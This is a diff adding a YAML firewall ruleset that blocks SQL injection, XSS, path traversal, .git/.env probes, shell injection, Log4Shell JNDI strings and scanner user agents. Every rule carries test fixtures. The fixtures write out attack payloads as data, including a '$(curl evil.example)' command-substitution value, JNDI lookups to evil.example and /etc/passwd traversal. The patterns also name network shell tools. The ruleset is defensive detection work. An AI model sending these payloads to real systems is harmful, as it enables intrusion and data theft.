@@ -1,0 +1,183 @@
+# Cloudveil core ruleset - enabled by default on every zone.
+#
+# Head-only: nothing here looks at the request body, so enabling it never makes the
+# edge buffer uploads. Body inspection lives in core-body.yaml, opt-in.
+#
+# Path and query arrive percent-decoded, and `+` in a query counts as a space, so
+# `union%20select` and `union+select` are caught alongside the plain form.
+#
+# Every rule carries fixtures and `cargo test` runs them. A rule without at least one
+# match and one nomatch fixture fails the build.
+
+rules:
+  - id: sqli-union-select
+    description: UNION SELECT, the workhorse of data extraction
+    action: block
+    severity: high
+    expression: >-
+      http.request.uri.query matches "(?i)\bunion\s+(all\s+)?select\b"
+    tests:
+      - { query: "id=1 UNION SELECT password FROM users", expect: match }
+      - { query: "id=1%20union%20all%20select%201", expect: match }
+      - { query: "id=1+union+select+1", expect: match }
+      - { query: "id=42", expect: nomatch }
+      - { query: "q=reunion selections", expect: nomatch }
+
+  - id: sqli-tautology
+    description: "' or 1=1 style always-true conditions"
+    action: block
+    severity: high
+    expression: >-
+      http.request.uri.query matches "(?i)'\s*(or|and)\s+'?\d+'?\s*=\s*'?\d+"
+    tests:
+      - { query: "id=1' or 1=1--", expect: match }
+      - { query: "user=admin'+OR+'1'='1", expect: match }
+      - { query: "id=1", expect: nomatch }
+      - { query: "note=it's fine", expect: nomatch }
+
+  - id: sqli-time-based
+    description: Blind SQLi probes that lean on a delay
+    action: block
+    severity: high
+    expression: >-
+      http.request.uri.query matches "(?i)\b(sleep|benchmark|pg_sleep)\s*\(|waitfor\s+delay"
+    tests:
+      - { query: "id=1;WAITFOR DELAY '0:0:5'", expect: match }
+      - { query: "id=1 and sleep(5)", expect: match }
+      - { query: "id=1", expect: nomatch }
+      - { query: "q=sleep tracking apps", expect: nomatch }
+
+  - id: xss-script-tag
+    description: An inline script tag in the query string
+    action: block
+    severity: high
+    expression: >-
+      http.request.uri.query matches "(?i)<\s*script\b"
+    tests:
+      - { query: "q=<script>alert(1)</script>", expect: match }
+      - { query: "q=%3Cscript%3Ealert(1)%3C/script%3E", expect: match }
+      - { query: "q=describe the script tag", expect: nomatch }
+
+  - id: xss-event-handler
+    description: Injected DOM event handlers
+    action: block
+    severity: high
+    expression: >-
+      http.request.uri.query matches "(?i)\bon(error|load|click|mouseover|focus|toggle)\s*="
+    tests:
+      - { query: "img=x onerror=alert(1)", expect: match }
+      - { query: "q=%3Cbody%20onload%3Dalert(1)%3E", expect: match }
+      - { query: "q=how onboarding works", expect: nomatch }
+      - { query: "onsale=true", expect: nomatch }
+
+  - id: xss-javascript-uri
+    description: "javascript: URIs in parameters"
+    action: block
+    severity: medium
+    expression: >-
+      http.request.uri.query matches "(?i)javascript\s*:"
+    tests:
+      - { query: "next=javascript:alert(1)", expect: match }
+      - { query: "url=JaVaScRiPt%3Aalert(1)", expect: match }
+      - { query: "q=learning javascript", expect: nomatch }
+
+  - id: traversal-dot-dot
+    description: Directory traversal in the path or query
+    action: block
+    severity: high
+    expression: >-
+      http.request.uri matches "(\.\./|\.\.\\\\)"
+    tests:
+      - { path: "/files/../../etc/passwd", expect: match }
+      - { path: "/files/%2e%2e%2f%2e%2e%2fetc/passwd", expect: match }
+      - { query: "file=../../secret", expect: match }
+      - { path: "/files/report.pdf", expect: nomatch }
+      - { path: "/compare/v1.2..v1.3", expect: nomatch }
+      - { query: "range=v1.2..v1.3", expect: nomatch }
+
+  - id: traversal-sensitive-file
+    description: Requests reaching for well-known system files
+    action: block
+    severity: critical
+    expression: >-
+      http.request.uri matches "(?i)(/etc/(passwd|shadow)\b|/proc/self/environ\b)"
+    tests:
+      - { path: "/etc/passwd", expect: match }
+      - { query: "file=/proc/self/environ", expect: match }
+      - { path: "/etc/passwords-policy.html", expect: nomatch }
+      - { path: "/docs/setup", expect: nomatch }
+
+  - id: probe-hidden-git
+    description: Scanning for an exposed .git directory
+    action: block
+    severity: medium
+    expression: >-
+      http.request.uri.path matches "(?i)/\.git(/|$)"
+    tests:
+      - { path: "/.git/config", expect: match }
+      - { path: "/app/.git/HEAD", expect: match }
+      - { path: "/gitlab/readme", expect: nomatch }
+      - { path: "/digital/assets", expect: nomatch }
+
+  - id: probe-env-file
+    description: Scanning for a leaked .env file
+    action: block
+    severity: high
+    expression: >-
+      http.request.uri.path matches "(?i)/\.env(\.|$)"
+    tests:
+      - { path: "/.env", expect: match }
+      - { path: "/config/.env.production", expect: match }
+      - { path: "/environment", expect: nomatch }
+      - { path: "/docs/.envoy-setup", expect: nomatch }
+
+  - id: shell-injection
+    description: Command chaining into a shell builtin
+    action: block
+    severity: critical
+    expression: >-
+      http.request.uri matches "(?i)(;|\|\||&&|`|\$\()\s*(cat|ls|curl|wget|nc|bash|sh|whoami|id|uname)\b"
+    tests:
+      - { query: "host=1.1.1.1; cat /etc/hostname", expect: match }
+      - { query: "x=1%20%26%26%20whoami", expect: match }
+      - { query: "cmd=$(curl evil.example)", expect: match }
+      - { query: "a=1&id=42", expect: nomatch }
+      - { query: "sort=id&dir=asc", expect: nomatch }
+
+  - id: log4shell-jndi
+    description: JNDI lookup strings, per CVE-2021-44228
+    action: block
+    severity: critical
+    expression: >-
+      http.request.uri matches "(?i)\$\{jndi:"
+      or http.request.headers["user-agent"] matches "(?i)\$\{jndi:"
+      or http.request.headers["x-api-version"] matches "(?i)\$\{jndi:"
+    tests:
+      - { query: "q=${jndi:ldap://evil.example/a}", expect: match }
+      - { headers: { user-agent: "${jndi:dns://evil.example}" }, expect: match }
+      - { query: "q=jndi lookups explained", expect: nomatch }
+      - { headers: { user-agent: "Mozilla/5.0" }, expect: nomatch }
+
+  - id: scanner-user-agent
+    description: Tools that announce themselves
+    action: block
+    severity: medium
+    expression: >-
+      http.request.headers["user-agent"] matches "(?i)\b(sqlmap|nikto|nmap|masscan|dirbuster|gobuster|wpscan|acunetix|nessus|havij)\b"
+    tests:
+      - { headers: { user-agent: "sqlmap/1.7.2#stable" }, expect: match }
+      - { headers: { user-agent: "Mozilla/5.0 (compatible; Nmap Scripting Engine)" }, expect: match }
+      - { headers: { user-agent: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)" }, expect: nomatch }
+      - { headers: { user-agent: "GoogleBot/2.1" }, expect: nomatch }
+
+  - id: missing-user-agent
+    description: >-
+      No user agent at all. Too common among real clients to block, but worth
+      watching - flip it to block once you've seen your own traffic.
+    action: log
+    severity: low
+    expression: >-
+      not http.request.headers["user-agent"] matches "."
+    tests:
+      - { path: "/", expect: match }
+      - { headers: { user-agent: "curl/8.4.0" }, expect: nomatch }
